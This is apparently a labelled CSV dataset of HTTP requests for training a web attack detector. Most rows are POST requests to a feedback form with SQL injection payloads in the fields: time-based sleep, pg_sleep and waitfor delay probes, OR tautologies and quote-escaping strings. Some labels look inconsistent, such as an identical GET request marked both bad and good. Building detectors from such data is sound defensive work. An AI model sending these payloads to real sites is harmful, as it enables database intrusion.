method,path,body,single_q,double_q,dashes,braces,spaces,badwords,class
POST,/sendFeedback,submit=Submit&cfile=comments.txt&comments=1&email_addr=sample%40email.tst&name=if(now()=sysdate()%2csleep(6)%2c0)&subject=1,0,0,0,4,0,1,bad
POST,/sendFeedback,submit=Submit&cfile=comments.txt&comments=-1'%20OR%202%2b940-940-1=0%2b0%2b0%2b1%20--%20&email_addr=sample%40email.tst&name=ckwiadcj&subject=1,1,0,1,0,4,0,bad
POST,/sendFeedback,"submit=Submit&cfile=comments.txt&comments=1&email_addr=%bf'%bf""&name=yqyvkaxo&subject=1",1,1,0,0,0,0,bad
POST,/sendFeedback,submit=Submit&cfile=comments.txt&comments=1&email_addr=sample%40email.tst&name=ckwiadcj&subject=-1'%20OR%202%2b832-832-1=0%2b0%2b0%2b1%20or%20'aAKZiHEc'=',4,0,0,0,4,0,bad
POST,/sendFeedback,submit=Submit&cfile=comments.txt&comments=1&email_addr=sample%40email.tst&name=ckwiadcj&subject=7pgTGTLe,0,0,0,0,0,0,bad
POST,/sendFeedback,submit=Submit&cfile=comments.txt&comments=1&email_addr=sample%40email.tst&name=1%00%c0%a7%c0%a2%252527%252522&subject=1,0,0,0,0,0,0,bad
POST,/sendFeedback,submit=Submit&cfile=comments.txt&comments=1&email_addr=sample%40email.tst&name=yqyvkaxo&subject=1%00%c0%a7%c0%a2%252527%252522,0,0,0,0,0,0,bad
POST,/sendFeedback,"submit=Submit&cfile=comments.txt&comments=1&email_addr=sample%40email.tst&name=%f0''%f0""""&subject=1",2,2,0,0,0,0,bad
POST,/sendFeedback,submit=Submit&cfile=comments.txt&comments=oBiLJOkK';select%20pg_sleep(6);%20--%20&email_addr=sample%40email.tst&name=ckwiadcj&subject=1,1,0,1,1,3,2,bad
POST,/sendFeedback,submit=Submit&cfile=VNrlGXkq';%20waitfor%20delay%20'0:0:3'%20--%20&comments=1&email_addr=sample%40email.tst&name=ckwiadcj&subject=1,3,0,1,0,5,2,bad
POST,/sendFeedback,"submit=Submit&cfile=comments.txt&comments=1&email_addr=sample%40email.tst&name=-1""%20OR%202%2b641-641-1=0%2b0%2b0%2b1%20--%20&subject=1",0,1,1,0,4,0,bad
POST,/sendFeedback,submit=Submit&cfile=comments.txt&comments=if(now()=sysdate()%2csleep(6)%2c0)&email_addr=sample%40email.tst&name=ckwiadcj&subject=1,0,0,0,4,0,1,bad
POST,/sendFeedback,submit=Submit&cfile=comments.txt&comments=1&email_addr=sample%40email.tst&name=ckwiadcj&subject=if(now()=sysdate()%2csleep(3)%2c0),0,0,0,4,0,1,bad
POST,/sendFeedback,submit=Submit&cfile=comments.txt&comments=1&email_addr=-1%20OR%203%2b580-580-1=0%2b0%2b0%2b1%20--%20&name=ckwiadcj&subject=1,0,0,1,0,4,0,bad
POST,/sendFeedback,"submit=Submit&cfile=comments.txt&comments=%bf'%bf""&email_addr=sample%40email.tst&name=yqyvkaxo&subject=1",1,1,0,0,0,0,bad
POST,/sendFeedback,"submit=Submit&cfile=comments.txt&comments=1&email_addr=1'""&name=yqyvkaxo&subject=1",1,1,0,0,0,0,bad
POST,/sendFeedback,submit=Submit&cfile=comments.txt&comments=1&email_addr=sample%40email.tst&name=ckwiadcj&subject=-1);%20waitfor%20delay%20'0:0:3'%20--%20,2,0,1,0,5,2,bad
POST,/sendFeedback,submit=Submit&cfile=%5c&comments=1&email_addr=sample%40email.tst&name=yqyvkaxo&subject=1,0,0,0,0,0,0,bad
POST,/sendFeedback,"submit=Submit&cfile=comments.txt&comments=1&email_addr=sample%40email.tst&name=ckwiadcj&subject=-1""%20OR%202%2b964-964-1=0%2b0%2b0%2b1%20--%20",0,1,1,0,4,0,bad
POST,/sendFeedback,"submit=Submit&cfile=comments.txt&comments=1&email_addr=sample%40email.tst&name=ckwiadcj&subject=0""XOR(if(now()=sysdate()%2csleep(9)%2c0))XOR""Z",0,2,0,5,0,1,bad
POST,/sendFeedback,submit=Submit&cfile=comments.txt&comments=1&email_addr=iwvl9mSh';%20waitfor%20delay%20'0:0:6'%20--%20&name=ckwiadcj&subject=1,3,0,1,0,5,2,bad
POST,/sendFeedback,submit=Submit&cfile=comments.txt&comments=1&email_addr=sample%40email.tst&name=%5c&subject=1,0,0,0,0,0,0,bad
POST,/sendFeedback,submit=Submit&cfile=comments.txt&comments=1&email_addr=sample%40email.tst&name=JyI=&subject=1,0,0,0,0,0,0,bad
POST,/sendFeedback,submit=Submit&cfile=comments.txt&comments=1&email_addr=-1%20OR%202%2b350-350-1=0%2b0%2b0%2b1&name=ckwiadcj&subject=1,0,0,0,0,2,0,bad
POST,/sendFeedback,submit=Submit&cfile=WJqyQazT&comments=1&email_addr=sample%40email.tst&name=ckwiadcj&subject=1,0,0,0,0,0,0,bad
POST,/sendFeedback,submit=Submit&cfile=comments.txt&comments=1&email_addr=sample%40email.tst&name=-1%20OR%202%2b376-376-1=0%2b0%2b0%2b1%20--%20&subject=1,0,0,1,0,4,0,bad
POST,/sendFeedback,"submit=Submit&cfile=comments.txt&comments=1&email_addr=sample%40email.tst&name=0""XOR(if(now()=sysdate()%2csleep(9)%2c0))XOR""Z&subject=1",0,2,0,5,0,1,bad
POST,/sendFeedback,submit=Submit&cfile=-1'%20OR%202%2b18-18-1=0%2b0%2b0%2b1%20--%20&comments=1&email_addr=sample%40email.tst&name=ckwiadcj&subject=1,1,0,1,0,4,0,bad
POST,/sendFeedback,submit=Submit&cfile=comments.txt&comments=1&email_addr=sample%40email.tst&name=ckwiadcj&subject=sDlldLMi';%20waitfor%20delay%20'0:0:6'%20--%20,3,0,1,0,5,2,bad
POST,/sendFeedback,submit=Submit&cfile=comments.txt&comments=%40%40LAgrU&email_addr=sample%40email.tst&name=yqyvkaxo&subject=1,0,0,0,0,0,0,bad
POST,/sendFeedback,submit=Submit&cfile=JyI=&comments=1&email_addr=sample%40email.tst&name=yqyvkaxo&subject=1,0,0,0,0,0,0,bad
POST,/sendFeedback,"submit=Submit&cfile=%bf'%bf""&comments=1&email_addr=sample%40email.tst&name=yqyvkaxo&subject=1",1,1,0,0,0,0,bad
POST,/sendFeedback,"submit=Submit&cfile=0""XOR(if(now()=sysdate()%2csleep(10)%2c0))XOR""Z&comments=1&email_addr=sample%40email.tst&name=ckwiadcj&subject=1",0,2,0,5,0,1,bad
POST,/sendFeedback,submit=Submit&cfile=comments.txt&comments=-1);%20waitfor%20delay%20'0:0:6'%20--%20&email_addr=sample%40email.tst&name=ckwiadcj&subject=1,2,0,1,0,5,2,bad
POST,/sendFeedback,submit=Submit&cfile=comments.txt&comments=1&email_addr=sample%40email.tst&name=BNJqHggD');select%20pg_sleep(6);%20--%20&subject=1,1,0,1,1,3,2,bad
POST,/sendFeedback,submit=Submit&cfile=comments.txt&comments=1&email_addr=sample%2540email.tst&name=yqyvkaxo&subject=1,0,0,0,0,0,0,bad
POST,/sendFeedback,"submit=Submit&cfile=comments.txt&comments=1&email_addr=%f0''%f0""""&name=yqyvkaxo&subject=1",2,2,0,0,0,0,bad
POST,/sendFeedback,submit=Submit&cfile=comments.txt&comments=1&email_addr=%5c&name=yqyvkaxo&subject=1,0,0,0,0,0,0,bad
POST,/sendFeedback,submit=Submit&cfile=comments.txt&comments=iDRZ8biN'));select%20pg_sleep(3);%20--%20&email_addr=sample%40email.tst&name=ckwiadcj&subject=1,1,0,1,1,3,2,bad
POST,/sendFeedback,"submit=Submit&cfile=comments.txt&comments=1&email_addr=sample%40email.tst&name=ckwiadcj&subject=(select(0)from(select(sleep(9)))v)/*'%2b(select(0)from(select(sleep(9)))v)%2b'""%2b(select(0)from(select(sleep(9)))v)%2b""*/",2,2,0,15,0,9,bad
POST,/sendFeedback,submit=Submit&cfile=NZvNTzGR'));select%20pg_sleep(10);%20--%20&comments=1&email_addr=sample%40email.tst&name=ckwiadcj&subject=1,1,0,1,1,3,2,bad
POST,/sendFeedback,submit=Submit&cfile=comments.txt&comments=qSHSncdC&email_addr=sample%40email.tst&name=ckwiadcj&subject=1,0,0,0,0,0,0,bad
POST,/sendFeedback,submit=Submit&cfile=comments.txt&comments=1&email_addr=sample%40email.tst&name=yqyvkaxo&subject=%40%40EqgWT,0,0,0,0,0,0,bad
POST,/sendFeedback,submit=Submit&cfile=comments.txt&comments=1&email_addr=sample%40email.tst&name=ckwiadcj&subject=-1%20OR%202%2b447-447-1=0%2b0%2b0%2b1,0,0,0,0,2,0,bad
POST,/sendFeedback,submit=Submit&cfile=comments.txt&comments=1&email_addr=sample%40email.tst&name=ckwiadcj&subject=1%20waitfor%20delay%20'0:0:6'%20--%20,2,0,1,0,5,2,bad
POST,/sendFeedback,submit=Submit&cfile=0'XOR(if(now()=sysdate()%2csleep(7)%2c0))XOR'Z&comments=1&email_addr=sample%40email.tst&name=ckwiadcj&subject=1,2,0,0,5,0,1,bad
POST,/sendFeedback,submit=Submit&cfile=comments.txt&comments=1&email_addr=sample%40email.tst&name=ckwiadcj&subject=1,0,0,0,0,0,0,bad
POST,/sendFeedback,submit=Submit&cfile=comments.txt&comments=0'XOR(if(now()=sysdate()%2csleep(9)%2c0))XOR'Z&email_addr=sample%40email.tst&name=ckwiadcj&subject=1,2,0,0,5,0,1,bad
POST,/sendFeedback,submit=Submit&cfile=comments.txt&comments=1&email_addr=-1%20OR%203*2>(0%2b5%2b580-580)%20--%20&name=ckwiadcj&subject=1,0,0,1,1,4,0,bad
POST,/sendFeedback,submit=Submit&cfile=comments.txt&comments=1&email_addr=sample%40email.tst&name=-1'%20OR%202%2b863-863-1=0%2b0%2b0%2b1%20--%20&subject=1,1,0,1,0,4,0,bad
POST,/sendFeedback,submit=Submit&cfile=comments.txt&comments=JyI=&email_addr=sample%40email.tst&name=yqyvkaxo&subject=1,0,0,0,0,0,0,bad
POST,/sendFeedback,submit=Submit&cfile=comments.txt&comments=1&email_addr=-1%20OR%203%2b350-350-1=0%2b0%2b0%2b1&name=ckwiadcj&subject=1,0,0,0,0,2,0,bad
POST,/sendFeedback,submit=Submit&cfile=comments.txt&comments=1&email_addr=sample%40email.tst&name=NGrVN4VM';select%20pg_sleep(6);%20--%20&subject=1,1,0,1,1,3,2,bad
POST,/sendFeedback,submit=Submit&cfile=comments.txt&comments=-1));select%20pg_sleep(3);%20--%20&email_addr=sample%40email.tst&name=ckwiadcj&subject=1,0,0,1,1,3,2,bad
POST,/sendFeedback,submit=Submit&cfile=comments.txt&comments=-1;select%20pg_sleep(9);%20--%20&email_addr=sample%40email.tst&name=ckwiadcj&subject=1,0,0,1,1,3,2,bad
POST,/sendFeedback,"submit=Submit&cfile=(select(0)from(select(sleep(10)))v)/*'%2b(select(0)from(select(sleep(10)))v)%2b'""%2b(select(0)from(select(sleep(10)))v)%2b""*/&comments=1&email_addr=sample%40email.tst&name=ckwiadcj&subject=1",2,2,0,15,0,9,bad
POST,/sendFeedback,submit=Submit&cfile=comments.txt&comments=1&email_addr=sample%2540email.tst%25'%20AND%202*3*8=6*8%20AND%20't4v9'!='t4v9%25&name=ckwiadcj&subject=1,4,0,0,0,4,0,bad
POST,/sendFeedback,submit=Submit&cfile=comments.txt&comments=1&email_addr=sample%40email.tst&name=xpBGuR7r'));select%20pg_sleep(9);%20--%20&subject=1,1,0,1,1,3,2,bad
POST,/sendFeedback,submit=Submit&cfile=comments.txt&comments=1&email_addr=sample%40email.tst&name=yqyvkaxo&subject=1,0,0,0,0,0,0,bad
POST,/sendFeedback,submit=Submit&cfile=comments.txt&comments=arVzSnJi';%20waitfor%20delay%20'0:0:9'%20--%20&email_addr=sample%40email.tst&name=ckwiadcj&subject=1,3,0,1,0,5,2,bad
POST,/sendFeedback,"submit=Submit&cfile=-1""%20OR%202%2b773-773-1=0%2b0%2b0%2b1%20--%20&comments=1&email_addr=sample%40email.tst&name=ckwiadcj&subject=1",0,1,1,0,4,0,bad
GET,/showimage.php,,0,0,0,0,0,0,good
GET,/signup.aspx,,0,0,0,0,0,0,bad
GET,/signup.aspx,,0,0,0,0,0,0,good
POST,/signup.aspx,btnSignup=Sign%20me%20up&tbPassword=g00dPa%24%24w0rD&tbUsername=eshppwte&__EVENTARGUMENT=1&__EVENTTARGET=1&__EVENTVALIDATION=/wEWWgK42oW1DwLStq24BwK3jsrkBALF97vxAQKJlpzeDwKOltTPCALcy6fWCQLcy6fWCQLcy9vqAgLcy9vqAgLcy4/SDwLcy4/SDwLcy6PpCALcy6PpCAKx0o2eCgKx0o2eCgKx0qG1AwKx0qG1AwKx0tXJDAKx0tXJDAKx0snsBQKx0snsBQKx0v2DDQKx0v2DDQKx0pGmBgKx0pGmBgKx0oX9DwKx0oX9DwKx0rmQBwKx0rmQBwKx0u35BQKx0u35BQKx0oGcDQKx0oGcDQKK%2bZMFAor5kwUCivmH2AkCivmH2AkCivm7/wICivm7/wICivmvkgoCivmvkgoCivnDtgMCivnDtgMCivn3zQwCivn3zQwCivnr4AUCivnr4AUCivmfhw0Civmfhw0Civnz7AsCivnz7AsCivnngwMCivnngwMCv5PTxAkCv5PTxAkCv5PHmwECv5PHmwECv5P7vgoCv5P7vgoCv5Pv1QMCv5Pv1QMCv5OD6AwCv5OD6AwCv5O3jwQCv5O3jwQCv5Orog0Cv5Orog0Cv5PfxgYCv5PfxgYCv5OzrgMCv5OzrgMCv5OnxQwCv5OnxQwCkLqx6g8CkLqx6g8CkLqlgQcCkLqlgQcCkLrZJQKQutklApC6zfgJApC6zfgJApC64Z8BApC64Z8BApC6lbIKApC6lbIKApC6ickDApC6ickDApC6vewMApC6vewMZDoBpcrMyHw3O3NO1Q9dy6PNVyI=&__VIEWSTATE=/wEPDwUKLTY0MzI4NjU4Mw9kFgICAQ9kFgICAQ9kFgQCAQ8WBB4EaHJlZgUKbG9naW4uYXNweB4JaW5uZXJodG1sBQVsb2dpbmQCAw8WBB8AZB4HVmlzaWJsZWhkZLWF2wpV006tz0eDdoKfDbx%2bi81I&__VIEWSTATEGENERATOR=36F90C25,0,0,0,0,2,0,bad
POST,/signup.aspx,btnSignup=Sign%20me%20up&tbPassword=1ACUSTART%5c&tbUsername=qhdpdcox&__EVENTARGUMENT=1&__EVENTTARGET=1&__EVENTVALIDATION=/wEWWgK42oW1DwLStq24BwK3jsrkBALF97vxAQKJlpzeDwKOltTPCALcy6fWCQLcy6fWCQLcy9vqAgLcy9vqAgLcy4/SDwLcy4/SDwLcy6PpCALcy6PpCAKx0o2eCgKx0o2eCgKx0qG1AwKx0qG1AwKx0tXJDAKx0tXJDAKx0snsBQKx0snsBQKx0v2DDQKx0v2DDQKx0pGmBgKx0pGmBgKx0oX9DwKx0oX9DwKx0rmQBwKx0rmQBwKx0u35BQKx0u35BQKx0oGcDQKx0oGcDQKK%2bZMFAor5kwUCivmH2AkCivmH2AkCivm7/wICivm7/wICivmvkgoCivmvkgoCivnDtgMCivnDtgMCivn3zQwCivn3zQwCivnr4AUCivnr4AUCivmfhw0Civmfhw0Civnz7AsCivnz7AsCivnngwMCivnngwMCv5PTxAkCv5PTxAkCv5PHmwECv5PHmwECv5P7vgoCv5P7vgoCv5Pv1QMCv5Pv1QMCv5OD6AwCv5OD6AwCv5O3jwQCv5O3jwQCv5Orog0Cv5Orog0Cv5PfxgYCv5PfxgYCv5OzrgMCv5OzrgMCv5OnxQwCv5OnxQwCkLqx6g8CkLqx6g8CkLqlgQcCkLqlgQcCkLrZJQKQutklApC6zfgJApC6zfgJApC64Z8BApC64Z8BApC6lbIKApC6lbIKApC6ickDApC6ickDApC6vewMApC6vewMZDoBpcrMyHw3O3NO1Q9dy6PNVyI=&__VIEWSTATE=/wEPDwUKLTY0MzI4NjU4Mw9kFgICAQ9kFgICAQ9kFgQCAQ8WBB4EaHJlZgUKbG9naW4uYXNweB4JaW5uZXJodG1sBQVsb2dpbmQCAw8WBB8AZB4HVmlzaWJsZWhkZLWF2wpV006tz0eDdoKfDbx%2bi81I&__VIEWSTATEGENERATOR=36F90C25,0,0,0,0,2,0,bad
POST,/signup.aspx,btnSignup=Sign%20me%20up&tbPassword=g00dPa%24%24w0rD&tbUsername=SqGCYwSJ&__EVENTARGUMENT=1&__EVENTTARGET=1&__EVENTVALIDATION=/wEWWgK42oW1DwLStq24BwK3jsrkBALF97vxAQKJlpzeDwKOltTPCALcy6fWCQLcy6fWCQLcy9vqAgLcy9vqAgLcy4/SDwLcy4/SDwLcy6PpCALcy6PpCAKx0o2eCgKx0o2eCgKx0qG1AwKx0qG1AwKx0tXJDAKx0tXJDAKx0snsBQKx0snsBQKx0v2DDQKx0v2DDQKx0pGmBgKx0pGmBgKx0oX9DwKx0oX9DwKx0rmQBwKx0rmQBwKx0u35BQKx0u35BQKx0oGcDQKx0oGcDQKK%2bZMFAor5kwUCivmH2AkCivmH2AkCivm7/wICivm7/wICivmvkgoCivmvkgoCivnDtgMCivnDtgMCivn3zQwCivn3zQwCivnr4AUCivnr4AUCivmfhw0Civmfhw0Civnz7AsCivnz7AsCivnngwMCivnngwMCv5PTxAkCv5PTxAkCv5PHmwECv5PHmwECv5P7vgoCv5P7vgoCv5Pv1QMCv5Pv1QMCv5OD6AwCv5OD6AwCv5O3jwQCv5O3jwQCv5Orog0Cv5Orog0Cv5PfxgYCv5PfxgYCv5OzrgMCv5OzrgMCv5OnxQwCv5OnxQwCkLqx6g8CkLqx6g8CkLqlgQcCkLqlgQcCkLrZJQKQutklApC6zfgJApC6zfgJApC64Z8BApC64Z8BApC6lbIKApC6lbIKApC6ickDApC6ickDApC6vewMApC6vewMZDoBpcrMyHw3O3NO1Q9dy6PNVyI=&__VIEWSTATE=/wEPDwUKLTY0MzI4NjU4Mw9kFgICAQ9kFgICAQ9kFgQCAQ8WBB4EaHJlZgUKbG9naW4uYXNweB4JaW5uZXJodG1sBQVsb2dpbmQCAw8WBB8AZB4HVmlzaWJsZWhkZLWF2wpV006tz0eDdoKfDbx%2bi81I&__VIEWSTATEGENERATOR=36F90C25,0,0,0,0,2,0,bad
POST,/signup.aspx,btnSignup=Sign%20me%20up&tbPassword=1acuOwgyHnmWke&tbUsername=decydgcw&__EVENTARGUMENT=1&__EVENTTARGET=1&__EVENTVALIDATION=/wEWWgK42oW1DwLStq24BwK3jsrkBALF97vxAQKJlpzeDwKOltTPCALcy6fWCQLcy6fWCQLcy9vqAgLcy9vqAgLcy4/SDwLcy4/SDwLcy6PpCALcy6PpCAKx0o2eCgKx0o2eCgKx0qG1AwKx0qG1AwKx0tXJDAKx0tXJDAKx0snsBQKx0snsBQKx0v2DDQKx0v2DDQKx0pGmBgKx0pGmBgKx0oX9DwKx0oX9DwKx0rmQBwKx0rmQBwKx0u35BQKx0u35BQKx0oGcDQKx0oGcDQKK%2bZMFAor5kwUCivmH2AkCivmH2AkCivm7/wICivm7/wICivmvkgoCivmvkgoCivnDtgMCivnDtgMCivn3zQwCivn3zQwCivnr4AUCivnr4AUCivmfhw0Civmfhw0Civnz7AsCivnz7AsCivnngwMCivnngwMCv5PTxAkCv5PTxAkCv5PHmwECv5PHmwECv5P7vgoCv5P7vgoCv5Pv1QMCv5Pv1QMCv5OD6AwCv5OD6AwCv5O3jwQCv5O3jwQCv5Orog0Cv5Orog0Cv5PfxgYCv5PfxgYCv5OzrgMCv5OzrgMCv5OnxQwCv5OnxQwCkLqx6g8CkLqx6g8CkLqlgQcCkLqlgQcCkLrZJQKQutklApC6zfgJApC6zfgJApC64Z8BApC64Z8BApC6lbIKApC6lbIKApC6ickDApC6ickDApC6vewMApC6vewMZDoBpcrMyHw3O3NO1Q9dy6PNVyI=&__VIEWSTATE=/wEPDwUKLTY0MzI4NjU4Mw9kFgICAQ9kFgICAQ9kFgQCAQ8WBB4EaHJlZgUKbG9naW4uYXNweB4JaW5uZXJodG1sBQVsb2dpbmQCAw8WBB8AZB4HVmlzaWJsZWhkZLWF2wpV006tz0eDdoKfDbx%2bi81I&__VIEWSTATEGENERATOR=36F90C25,0,0,0,0,2,0,bad
POST,/signup.aspx,btnSignup=Sign%20me%20up&tbPassword=g00dPa%24%24w0rD&tbUsername=1ACUSTART%5c&__EVENTARGUMENT=1&__EVENTTARGET=1&__EVENTVALIDATION=/wEWWgK42oW1DwLStq24BwK3jsrkBALF97vxAQKJlpzeDwKOltTPCALcy6fWCQLcy6fWCQLcy9vqAgLcy9vqAgLcy4/SDwLcy4/SDwLcy6PpCALcy6PpCAKx0o2eCgKx0o2eCgKx0qG1AwKx0qG1AwKx0tXJDAKx0tXJDAKx0snsBQKx0snsBQKx0v2DDQKx0v2DDQKx0pGmBgKx0pGmBgKx0oX9DwKx0oX9DwKx0rmQBwKx0rmQBwKx0u35BQKx0u35BQKx0oGcDQKx0oGcDQKK%2bZMFAor5kwUCivmH2AkCivmH2AkCivm7/wICivm7/wICivmvkgoCivmvkgoCivnDtgMCivnDtgMCivn3zQwCivn3zQwCivnr4AUCivnr4AUCivmfhw0Civmfhw0Civnz7AsCivnz7AsCivnngwMCivnngwMCv5PTxAkCv5PTxAkCv5PHmwECv5PHmwECv5P7vgoCv5P7vgoCv5Pv1QMCv5Pv1QMCv5OD6AwCv5OD6AwCv5O3jwQCv5O3jwQCv5Orog0Cv5Orog0Cv5PfxgYCv5PfxgYCv5OzrgMCv5OzrgMCv5OnxQwCv5OnxQwCkLqx6g8CkLqx6g8CkLqlgQcCkLqlgQcCkLrZJQKQutklApC6zfgJApC6zfgJApC64Z8BApC64Z8BApC6lbIKApC6lbIKApC6ickDApC6ickDApC6vewMApC6vewMZDoBpcrMyHw3O3NO1Q9dy6PNVyI=&__VIEWSTATE=/wEPDwUKLTY0MzI4NjU4Mw9kFgICAQ9kFgICAQ9kFgQCAQ8WBB4EaHJlZgUKbG9naW4uYXNweB4JaW5uZXJodG1sBQVsb2dpbmQCAw8WBB8AZB4HVmlzaWJsZWhkZLWF2wpV006tz0eDdoKfDbx%2bi81I&__VIEWSTATEGENERATOR=36F90C25,0,0,0,0,2,0,bad
POST,/signup.aspx,btnSignup=Sign%20me%20up&tbPassword=g00dPa%24%24w0rD&tbUsername=1acuHj5RDnfl7J&__EVENTARGUMENT=1&__EVENTTARGET=1&__EVENTVALIDATION=/wEWWgK42oW1DwLStq24BwK3jsrkBALF97vxAQKJlpzeDwKOltTPCALcy6fWCQLcy6fWCQLcy9vqAgLcy9vqAgLcy4/SDwLcy4/SDwLcy6PpCALcy6PpCAKx0o2eCgKx0o2eCgKx0qG1AwKx0qG1AwKx0tXJDAKx0tXJDAKx0snsBQKx0snsBQKx0v2DDQKx0v2DDQKx0pGmBgKx0pGmBgKx0oX9DwKx0oX9DwKx0rmQBwKx0rmQBwKx0u35BQKx0u35BQKx0oGcDQKx0oGcDQKK%2bZMFAor5kwUCivmH2AkCivmH2AkCivm7/wICivm7/wICivmvkgoCivmvkgoCivnDtgMCivnDtgMCivn3zQwCivn3zQwCivnr4AUCivnr4AUCivmfhw0Civmfhw0Civnz7AsCivnz7AsCivnngwMCivnngwMCv5PTxAkCv5PTxAkCv5PHmwECv5PHmwECv5P7vgoCv5P7vgoCv5Pv1QMCv5Pv1QMCv5OD6AwCv5OD6AwCv5O3jwQCv5O3jwQCv5Orog0Cv5Orog0Cv5PfxgYCv5PfxgYCv5OzrgMCv5OzrgMCv5OnxQwCv5OnxQwCkLqx6g8CkLqx6g8CkLqlgQcCkLqlgQcCkLrZJQKQutklApC6zfgJApC6zfgJApC64Z8BApC64Z8BApC6lbIKApC6lbIKApC6ickDApC6ickDApC6vewMApC6vewMZDoBpcrMyHw3O3NO1Q9dy6PNVyI=&__VIEWSTATE=/wEPDwUKLTY0MzI4NjU4Mw9kFgICAQ9kFgICAQ9kFgQCAQ8WBB4EaHJlZgUKbG9naW4uYXNweB4JaW5uZXJodG1sBQVsb2dpbmQCAw8WBB8AZB4HVmlzaWJsZWhkZLWF2wpV006tz0eDdoKfDbx%2bi81I&__VIEWSTATEGENERATOR=36F90C25,0,0,0,0,2,0,bad
POST,/signup.aspx,btnSignup=Sign%20me%20up&tbPassword=g00dPa%2524%2524w0rD&tbUsername=eshppwte&__EVENTARGUMENT=1&__EVENTTARGET=1&__EVENTVALIDATION=/wEWWgK42oW1DwLStq24BwK3jsrkBALF97vxAQKJlpzeDwKOltTPCALcy6fWCQLcy6fWCQLcy9vqAgLcy9vqAgLcy4/SDwLcy4/SDwLcy6PpCALcy6PpCAKx0o2eCgKx0o2eCgKx0qG1AwKx0qG1AwKx0tXJDAKx0tXJDAKx0snsBQKx0snsBQKx0v2DDQKx0v2DDQKx0pGmBgKx0pGmBgKx0oX9DwKx0oX9DwKx0rmQBwKx0rmQBwKx0u35BQKx0u35BQKx0oGcDQKx0oGcDQKK%2bZMFAor5kwUCivmH2AkCivmH2AkCivm7/wICivm7/wICivmvkgoCivmvkgoCivnDtgMCivnDtgMCivn3zQwCivn3zQwCivnr4AUCivnr4AUCivmfhw0Civmfhw0Civnz7AsCivnz7AsCivnngwMCivnngwMCv5PTxAkCv5PTxAkCv5PHmwECv5PHmwECv5P7vgoCv5P7vgoCv5Pv1QMCv5Pv1QMCv5OD6AwCv5OD6AwCv5O3jwQCv5O3jwQCv5Orog0Cv5Orog0Cv5PfxgYCv5PfxgYCv5OzrgMCv5OzrgMCv5OnxQwCv5OnxQwCkLqx6g8CkLqx6g8CkLqlgQcCkLqlgQcCkLrZJQKQutklApC6zfgJApC6zfgJApC64Z8BApC64Z8BApC6lbIKApC6lbIKApC6ickDApC6ickDApC6vewMApC6vewMZDoBpcrMyHw3O3NO1Q9dy6PNVyI=&__VIEWSTATE=/wEPDwUKLTY0MzI4NjU4Mw9kFgICAQ9kFgICAQ9kFgQCAQ8WBB4EaHJlZgUKbG9naW4uYXNweB4JaW5uZXJodG1sBQVsb2dpbmQCAw8WBB8AZB4HVmlzaWJsZWhkZLWF2wpV006tz0eDdoKfDbx%2bi81I&__VIEWSTATEGENERATOR=36F90C25,0,0,0,0,2,0,bad
